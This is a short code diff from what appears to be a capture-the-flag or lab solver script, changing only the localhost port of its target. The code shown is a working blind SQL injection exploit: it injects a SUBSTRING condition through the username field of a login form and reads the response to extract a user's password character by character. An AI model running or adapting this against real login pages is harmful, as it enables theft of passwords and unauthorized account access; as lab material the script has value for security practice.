@@ -6,7 +6,7 @@ wordlist = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^
 
 def exploiter(string, end):
     goesIn = f"{username}' AND SUBSTRING(password, 1, {end})='{string}' -- "
-    r = requests.post('http://localhost:5050/login', data={'username': goesIn, 'password': 'doesn\'t matter'})
+    r = requests.post('http://localhost:32770/login', data={'username': goesIn, 'password': 'doesn\'t matter'})
     return "Invalid" not in r.text
 
 end=1
